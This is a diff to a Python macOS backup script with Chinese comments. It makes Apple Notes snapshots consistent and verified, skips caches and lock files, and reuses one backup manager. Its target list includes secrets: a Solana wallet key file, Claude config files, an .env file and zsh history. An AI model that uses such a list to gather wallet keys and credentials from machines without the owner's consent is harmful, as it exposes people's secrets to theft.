@@ -18,6 +18,7 @@ import subprocess
 import getpass
 import traceback
 import glob
+import fnmatch
 import re
 import json
 import sqlite3
@@ -260,7 +261,8 @@ class BackupConfig:
         ".zsh_history",                                           # Zsh历史记录
         ".zsh_sessions",                                          # Zsh会话
         "Desktop",                                                # 桌面目录
-        "Library/Group Containers/group.com.apple.notes",         # 备忘录数据目录
+        # 备忘录数据目录不在此备份：group.com.apple.notes 内是 WAL 模式的 SQLite，
+        # 裸拷贝可能与正在写入的数据库错配。统一由 backup_notes() 用 SQLite backup API 处理。
         "Library/Application Support/Claude/claude_desktop_config.json",
         ".config/solana/id.json",
         ".claude/config.json",
@@ -280,6 +282,25 @@ class BackupConfig:
         ".openclaw/workspace/.env",
         ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
     ]
+
+    # 备忘录容器（group.com.apple.notes）内可重建的目录，按目录名匹配，忽略大小写。
+    # 这些目录由系统按需重新生成，不影响恢复后的笔记正文与附件。
+    NOTES_EXCLUDE_DIR_NAMES = {
+        "previews",          # 笔记缩略图，如 Accounts/<uuid>/Previews/<uuid>-1-192x164-0.png
+        "thumbnails",        # Paper 预览模板图（Thumbnails/Default/*.png|json）
+        "fallbackimages",    # 附件缺图占位图
+    }
+    # 按相对路径匹配的可重建目录（容器内缓存目录）
+    NOTES_EXCLUDE_DIR_PATHS = {
+        "library/caches",    # 容器缓存，如 Library/Caches/Paper
+    }
+    # 备忘录容器内无需备份的临时/索引状态文件（glob，忽略大小写）
+    NOTES_EXCLUDE_FILE_PATTERNS = (
+        "*.lock",                     # com.apple.notes.databaseopen.lock
+        "sharingextensionwritelock",  # 锁文件（无扩展名，不会被 *.lock 匹配）
+        "html.index-progress", # HTML 索引进度
+        "notesindexerstate-*", # 索引器状态，恢复后会自行重建
+    )
 
 # 模块加载时只配置控制台日志；文件日志在 BackupManager 创建备份目录后由 _setup_logging 初始化。
 logging.basicConfig(
@@ -405,7 +426,12 @@ class BackupManager:
                 logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
             )
             
-            # 清除现有处理器
+            # 清除现有处理器；先关闭再移除，避免反复初始化 BackupManager 时泄漏文件描述符
+            for handler in root_logger.handlers[:]:
+                try:
+                    handler.close()
+                except Exception:
+                    pass
             root_logger.handlers.clear()
             
             # 添加处理器
@@ -1969,8 +1995,12 @@ def clean_backup_directory():
     except Exception as e:
         logging.error(f"清理备份目录失败: {e}")
 
-def backup_notes():
-    """备份Mac的备忘录数据"""
+def backup_notes(backup_manager=None):
+    """备份Mac的备忘录数据
+
+    Args:
+        backup_manager: 可复用的备份管理器实例；未提供时自建一个（不推荐重复自建）
+    """
     username = getpass.getuser()
     user_prefix = username[:5] if username else "user"
     notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
@@ -1980,11 +2010,28 @@ def backup_notes():
         logging.error("备忘录数据目录不存在")
         return None
         
-    backup_manager = BackupManager()
+    if backup_manager is None:
+        backup_manager = BackupManager()
     if not backup_manager._ensure_free_space(0, os.path.dirname(notes_backup_directory) or notes_backup_directory):
         return None
     if not backup_manager._clean_directory(notes_backup_directory):
         return None
+
+    def db_fingerprint(conn):
+        """给数据库做粗粒度指纹（笔记行数 + 最近修改时间），用于核对快照是否与源库一致。"""
+        note_rows = None
+        last_modified = None
+        try:
+            note_rows = conn.execute("SELECT COUNT(*) FROM ZICNOTEDATA").fetchone()[0]
+        except sqlite3.Error:
+            pass
+        try:
+            last_modified = conn.execute(
+                "SELECT MAX(ZMODIFICATIONDATE) FROM ZICCLOUDSYNCINGOBJECT"
+            ).fetchone()[0]
+        except sqlite3.Error:
+            pass
+        return note_rows, last_modified
 
     def snapshot_sqlite(source_file, target_file):
         """使用 SQLite backup API 生成一致性快照，包含已提交的 WAL 数据。"""
@@ -1994,6 +2041,8 @@ def backup_notes():
         try:
             source_uri = Path(source_file).as_uri() + "?mode=ro"
             src_conn = sqlite3.connect(source_uri, uri=True, timeout=10)
+            # 先读取源库指纹：快照必须不早于此刻的状态，否则说明漏掉了 WAL 中已提交的数据。
+            source_rows, source_last = db_fingerprint(src_conn)
             dst_conn = sqlite3.connect(target_file)
             with dst_conn:
                 src_conn.backup(dst_conn)
@@ -2006,6 +2055,27 @@ def backup_notes():
             integrity = check_conn.execute("PRAGMA integrity_check").fetchone()
             if not integrity or str(integrity[0]).lower() != "ok":
                 raise sqlite3.DatabaseError(f"integrity_check 返回异常: {integrity}")
+
+            # 空数据库的 integrity_check 同样是 ok，因此必须核对内容是否真的拷到。
+            snap_rows, snap_last = db_fingerprint(check_conn)
+            stale_reason = None
+            if (source_rows is None) != (snap_rows is None):
+                stale_reason = f"快照缺少源库中的笔记数据表（源库 {source_rows} 行，快照 {snap_rows}）"
+            elif source_rows is not None and snap_rows < source_rows:
+                stale_reason = f"快照笔记数少于源库: {snap_rows} < {source_rows}"
+            elif source_last is not None and snap_last is not None and snap_last < source_last:
+                stale_reason = f"快照落后于源库: {snap_last} < {source_last}"
+            if stale_reason:
+                raise sqlite3.DatabaseError(stale_reason)
+            if snap_rows != source_rows:
+                logging.warning(f"快照与源库笔记数不同（备份期间可能有正常写入）: {snap_rows}/{source_rows}")
+
+            # 让快照自带完整数据，不再依赖 -wal/-shm 才可打开；失败不影响可用性。
+            try:
+                check_conn.execute("PRAGMA journal_mode=DELETE")
+            except sqlite3.Error as e:
+                logging.warning(f"快照切换单文件模式失败（不影响可用性） {target_file}: {e}")
+
             return True
         except Exception as e:
             logging.error(f"生成备忘录数据库一致性快照失败 {source_file}: {e}")
@@ -2018,23 +2088,60 @@ def backup_notes():
                     except Exception:
                         pass
 
+    def notes_excluded_dir(relative_path):
+        """判断备忘录容器内的目录是否可重建，可安全跳过。"""
+        if os.path.basename(relative_path).lower() in BackupConfig.NOTES_EXCLUDE_DIR_NAMES:
+            return True
+        normalized = relative_path.lower().replace(os.sep, "/")
+        return any(
+            normalized == path or normalized.startswith(path + "/")
+            for path in BackupConfig.NOTES_EXCLUDE_DIR_PATHS
+        )
+
+    def notes_excluded_file(file_name):
+        """判断备忘录容器内的文件是否只是锁文件或索引状态，可安全跳过。"""
+        lower_name = file_name.lower()
+        return any(
+            fnmatch.fnmatch(lower_name, pattern)
+            for pattern in BackupConfig.NOTES_EXCLUDE_FILE_PATTERNS
+        )
+
     try:
         copied_count = 0
+        failed_files = []
         sqlite_failed = False
+        skipped_dirs = 0
+        skipped_files = 0
         # 复制附件和所有非 SQLite 文件；.sqlite 使用一致性快照，
-        # .sqlite-wal/.sqlite-shm 不直接复制，避免产生无法恢复的半提交状态。
-        for root, _, files in os.walk(notes_dir):
+        # .sqlite-wal/.sqlite-shm 不直接复制，避免产生无法恢复的半提交状态；
+        # 缩略图、缓存等可重建目录直接剪枝，不进入遍历。
+        for root, dirs, files in os.walk(notes_dir, topdown=True):
+            keep_dirs = []
+            for dir_name in dirs:
+                relative_dir = os.path.relpath(os.path.join(root, dir_name), notes_dir)
+                if notes_excluded_dir(relative_dir):
+                    skipped_dirs += 1
+                else:
+                    keep_dirs.append(dir_name)
+            dirs[:] = keep_dirs
+
             for file in files:
                 source_file = os.path.join(root, file)
                 if not os.path.exists(source_file):
                     continue
 
                 if file.endswith('.sqlite-wal') or file.endswith('.sqlite-shm'):
+                    skipped_files += 1
+                    continue
+
+                if notes_excluded_file(file):
+                    skipped_files += 1
                     continue
 
                 relative_path = os.path.relpath(root, notes_dir)
                 target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                 if not backup_manager._ensure_directory(target_sub_dir):
+                    failed_files.append(source_file)
                     continue
 
                 target_file = os.path.join(target_sub_dir, file)
@@ -2048,18 +2155,31 @@ def backup_notes():
                         shutil.copy2(source_file, target_file)
                         copied_count += 1
                     except Exception as e:
+                        failed_files.append(source_file)
                         logging.error(f"复制备忘录附件失败 {source_file}: {e}")
 
-        if copied_count == 0 or sqlite_failed:
-            logging.error("备忘录备份不完整：没有可复制文件或数据库快照失败")
+        # 附件缺失同样属于备份不完整，必须整体判失败并重试，否则会在压缩后被静默丢弃。
+        if copied_count == 0 or sqlite_failed or failed_files:
+            logging.error(
+                f"备忘录备份不完整：成功复制 {copied_count} 个文件，"
+                f"数据库快照失败={sqlite_failed}，附件失败 {len(failed_files)} 个"
+            )
             return None
+        logging.info(
+            f"备忘录备份完成：复制 {copied_count} 个文件，"
+            f"跳过可重建目录 {skipped_dirs} 个、临时文件 {skipped_files} 个"
+        )
         return notes_backup_directory
     except Exception as e:
         logging.error(f"备份备忘录数据失败: {e}")
         return None
 
-def backup_screenshots():
-    """备份截图文件"""
+def backup_screenshots(backup_manager=None):
+    """备份截图文件
+
+    Args:
+        backup_manager: 可复用的备份管理器实例；未提供时自建一个（不推荐重复自建）
+    """
     def get_screenshot_location():
         """读取 macOS 截图自定义保存路径（若存在）"""
         try:
@@ -2097,7 +2217,8 @@ def backup_screenshots():
     user_prefix = username[:5] if username else "user"
     screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
     
-    backup_manager = BackupManager()
+    if backup_manager is None:
+        backup_manager = BackupManager()
     
     # 确保备份目录是空的
     if not backup_manager._ensure_free_space(0, os.path.dirname(screenshot_backup_directory) or screenshot_backup_directory):
@@ -2179,7 +2300,7 @@ def backup_mac_data(backup_manager):
     partial_detected = False
     try:
         # 备份备忘录数据
-        notes_backup = backup_notes()
+        notes_backup = backup_notes(backup_manager)
         if notes_backup:
             backup_path = backup_manager.zip_backup_folder(
                 notes_backup,
@@ -2199,7 +2320,7 @@ def backup_mac_data(backup_manager):
             partial_detected = True
         
         # 备份截图文件
-        screenshots_backup = backup_screenshots()
+        screenshots_backup = backup_screenshots(backup_manager)
         if screenshots_backup:
             backup_path = backup_manager.zip_backup_folder(
                 screenshots_backup,
